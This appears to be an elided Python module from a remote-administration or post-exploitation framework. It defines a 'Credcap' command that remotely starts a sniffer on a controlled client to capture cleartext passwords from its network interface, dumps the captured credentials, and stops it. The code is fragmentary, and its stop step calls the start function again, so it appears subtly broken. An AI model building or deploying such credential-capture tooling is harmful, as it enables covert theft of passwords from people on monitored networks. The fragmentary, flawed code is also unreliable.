...
class Credcap(GhostModule):
    """
        Sniffs cleartext passwords from interface
    """
    unique_instance = True
    dependencies=['netifaces', 'gzip', 'BaseHTTPServer', 'ghostutils.netcreds']
    qa = QA_DANGEROUS

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = GhostArgumentParser(prog='credcap', description=cls.__doc__)
    ...
    def run(self, args):
        if args.action=="start":
            ...
            credcap_start = self.client.remote('ghostutils.netcreds', 'credcap_start', False)
            ...
            credcap_dump = self.client.remote('ghostutils.netcreds', 'credcap_dump')
            data = credcap_dump()
            ...
            credcap_stop = self.client.remote('ghostutils.netcreds', 'credcap_start')
            credcap_stop()
